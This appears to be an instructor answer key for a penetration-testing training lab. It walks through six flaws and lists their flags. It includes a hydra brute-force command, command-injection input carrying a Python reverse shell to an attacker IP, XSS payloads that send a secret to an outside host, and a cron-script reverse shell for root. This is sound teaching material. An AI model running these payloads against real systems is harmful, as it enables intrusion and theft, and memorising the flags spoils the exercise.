# BREW & BEAN – Complete Instructor Exploitation & Verification Guide
> **CONFIDENTIAL – INSTRUCTOR / EVALUATOR REFERENCE**

This guide provides step-by-step technical walkthroughs, curl commands, injection payloads, and verification criteria for all six vulnerabilities in the **BREW & BEAN** penetration testing training environment.

---

## 1. Vulnerability 1: Username Enumeration & Password Brute Force (BB-F01)

### Technical Flaw:
The endpoint `/login.php` returns different error messages depending on whether the username exists:
- Non-existent username: `Account verification failed: No user found with username '<input>'.`
- Existing username with incorrect password: `Authentication failed: Invalid password provided for registered user '<input>'.`
- There is no rate limiting on the login interface.

### Exploitation Walkthrough:
1. **Username Enumeration via ffuf or hydra**:
   ```bash
   # Test for username presence
   curl -s -X POST http://<TARGET_IP>/login.php \
     -d "username=nonexistent_user&password=password123" | grep "failed:"
   # Response: "No user found with username 'nonexistent_user'."

   curl -s -X POST http://<TARGET_IP>/login.php \
     -d "username=alex_morgan&password=wrongpassword" | grep "failed:"
   # Response: "Invalid password provided for registered user 'alex_morgan'."
   ```

2. **Password Auditing (Hydra / Medusa / Python)**:
   Audit `alex_morgan` against `/usr/share/wordlists/rockyou.txt`:
   ```bash
   hydra -l alex_morgan -P /usr/share/wordlists/rockyou.txt <TARGET_IP> http-post-form \
     "/login.php:username=^USER^&password=^PASS^:Invalid password"
   ```
   Password cracked: `coffee123`

3. **Obtaining Flag BB-F01**:
   Log in as `alex_morgan` with password `coffee123` at `/login.php`. The interface displays the verification banner:
   ```
   FLAG{BREW_USER_ENUMERATION_01}
   ```

---

## 2. Vulnerability 2: Horizontal Privilege Escalation (IDOR) (BB-F02)

### Technical Flaw:
The order details endpoint `/order-details.php?id=<id>` retrieves orders by primary key ID without verifying that the order belongs to the currently authenticated customer (`$_SESSION['user_id']`).

### Exploitation Walkthrough:
1. Register a new customer account or log in with any valid user (e.g. `alex_morgan` or newly registered account).
2. Browse your own orders at `/orders.php`. Note the sequential integer ID structure (e.g. `101`, `102`).
3. Enumerate or iterate `id`:
   Access `/order-details.php?id=104`.
4. Order #104 belongs to customer `michael_b` and represents a confidential VIP executive corporate catering order.
5. Because the viewer's user ID does not match `michael_b`, the application displays the unauthorized record access callout along with the flag:
   ```
   FLAG{BREW_IDOR_02}
   ```

---

## 3. Vulnerability 3: Vertical Privilege Escalation (BB-F03)

### Technical Flaw:
The endpoint `/admin/reports.php` only checks if a user is logged in (`isLoggedIn()`), but completely fails to check if the user's role is `admin` (`isAdmin()`).

### Exploitation Walkthrough:
1. Authenticate to the web application as a normal customer (`alex_morgan`) or staff member (`staff_sarah`).
2. Discover or browse directly to the administrative reports path:
   `http://<TARGET_IP>/admin/reports.php`
3. The server permits access and renders the "Q4 Financial Audit & Security Assessment" report.
4. The confidential audit report reveals the classified findings along with the flag:
   ```
   FLAG{BREW_VERTICAL_ACCESS_03}
   ```

---

## 4. Vulnerability 4: OS Command Injection & Initial Access (BB-F04)

### Technical Flaw:
On `/track-delivery.php`, the "Courier Gateway Diagnostic Utility" accepts a `gateway` parameter and directly passes it into a shell execution function:
```php
$command = "ping -c 2 " . $gateway . " 2>&1";
$output = shell_exec($command);
```

### Exploitation Walkthrough:
1. Navigate to `/track-delivery.php`.
2. In the Courier Gateway Host input field, test command chaining characters:
   ```
   127.0.0.1; whoami
   ```
   Output:
   ```
   PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data...
   www-data
   ```
3. Locate and read the initial access proof file at `/opt/flags/flag4.txt`:
   Payload:
   ```
   127.0.0.1; cat /opt/flags/flag4.txt
   ```
   Response reveals:
   ```
   FLAG{BREW_COMMAND_INJECTION_04}
   ```
4. **Obtaining an Interactive Reverse Shell (Initial Access)**:
   Start a listener on Kali (`nc -lvnp 4444`) and inject:
   ```
   127.0.0.1; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<KALI_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
   ```
   Yields initial access shell as user `www-data`.

---

## 5. Vulnerability 5: Stored Cross-Site Scripting (BB-F05)

### Technical Flaw:
The review submission form on `/reviews.php` stores comments without sanitization. In the staff review portal (`/staff/reviews.php`), comments are rendered as raw HTML without escaping (`<?= $rev['comment'] ?>`).

The automated headless browser (`brew-staff`) periodically logs into the staff portal and navigates to `/staff/reviews.php`.

### Exploitation Walkthrough:
1. Navigate to `/reviews.php`.
2. Submit a review with an XSS payload designed to execute in the staff browser session:
   - **Option A (Alert Verification)**:
     ```html
     <script>alert("XSS-BREW-STAFF")</script>
     ```
     The automated Playwright staff bot intercepts the `dialog` event and automatically alerts the verifier service!
   - **Option B (Cookie Exfiltration / API Trigger)**:
     ```html
     <script>fetch('/api/staff-verify.php').then(r=>r.json()).then(d=>fetch('http://<KALI_IP>:8000/?flag='+d.flag));</script>
     ```
   - **Option C (Image Beacon Exfiltration)**:
     ```html
     <img src=x onerror="fetch('/api/staff-verify.php')">
     ```
3. When the staff bot visits `/staff/reviews.php` (within 20 seconds), the script executes with the staff member's session and the `staff_secret_token` cookie containing:
   ```
   FLAG{BREW_STORED_XSS_05}
   ```
4. In the Verifier Portal (`http://<TARGET_IP>:8000`), the challenge will be recorded as verified!

---

## 6. Vulnerability 6: Linux Privilege Escalation via Cron (BB-F06)

### Technical Flaw:
The target container runs a root cron job (`/etc/cron.d/brew-cron`) executing `/opt/scripts/cleanup_cache.sh` every minute. The script `/opt/scripts/cleanup_cache.sh` is owned by `root:www-data` and has file mode `0777` (world-writable). Non-root user `www-data` can overwrite or append arbitrary commands to it.

The final flag `/root/flags/root.txt` is owned by `root:root` with permissions `0600` (inaccessible to non-root).

### Exploitation Walkthrough:
1. From the `www-data` shell obtained via command injection:
   Inspect scheduled tasks and crontabs:
   ```bash
   cat /etc/cron.d/brew-cron
   ```
   Output:
   ```cron
   * * * * * root /opt/scripts/cleanup_cache.sh >> /var/log/brew-maintenance.log 2>&1
   ```
2. Check permissions on `/opt/scripts/cleanup_cache.sh`:
   ```bash
   ls -la /opt/scripts/cleanup_cache.sh
   # -rwxrwxrwx 1 root www-data ... /opt/scripts/cleanup_cache.sh
   ```
3. Append a command to copy the root flag to a world-readable directory, or create a setuid root bash:
   ```bash
   echo "cat /root/flags/root.txt > /tmp/root_flag.txt && chmod 666 /tmp/root_flag.txt" >> /opt/scripts/cleanup_cache.sh
   ```
   Or establish a root reverse shell:
   ```bash
   echo "bash -i >& /dev/tcp/<KALI_IP>/5555 0>&1" >> /opt/scripts/cleanup_cache.sh
   ```
4. Wait up to 60 seconds for the cron daemon to execute `/opt/scripts/cleanup_cache.sh` as `root`.
5. Read the extracted root flag:
   ```bash
   cat /tmp/root_flag.txt
   ```
   Output:
   ```
   FLAG{BREW_ROOT_ESCALATION_06}
   ```
6. Submit the flag to `http://<TARGET_IP>:8000/` to complete the lab!

